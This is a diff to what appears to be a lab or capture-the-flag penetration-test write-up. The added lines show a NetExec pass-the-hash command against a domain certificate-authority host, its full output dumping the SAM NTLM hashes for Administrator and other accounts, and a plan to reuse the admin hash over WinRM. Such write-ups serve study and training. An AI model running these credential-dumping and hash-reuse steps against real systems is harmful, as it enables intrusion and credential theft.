@@ -370,5 +370,19 @@ I have now generate the beacon now ill get access via winrm upload the beacon an
 So it appears that account cannot get access via winrm so what ill do instead it just dump the SAM 
 
 ```python
+nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' --sam
+SMB         10.10.10.134    445    CA               [*] Windows 11 / Server 2025 Build 26100 x64 (name:CA) (domain:ext.darkhaven.local) (signing:False) (SMBv1:None)
+SMB         10.10.10.134    445    CA               [+] ext.darkhaven.local\ca_svc_account$:3ab7add8db852831e7299c61ba35e2d2 (Pwn3d!)
+SMB         10.10.10.134    445    CA               [*] Dumping SAM hashes
+SMB         10.10.10.134    445    CA               Administrator:500:aad3b435b51404eeaad3b435b51404ee:7af69f428fd21312a225c74e5f574ed6:::
+SMB         10.10.10.134    445    CA               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.134    445    CA               DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.134    445    CA               WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
+SMB         10.10.10.134    445    CA               ca_svc_account$:1000:aad3b435b51404eeaad3b435b51404ee:d825d33332279362b7c3e6ba121aa570:::
+SMB         10.10.10.134    445    CA               [+] Added 5 SAM hashes to the database
+```
+Now i can use the administrator hash to get access via winrm 
+
+```python
 
 ```
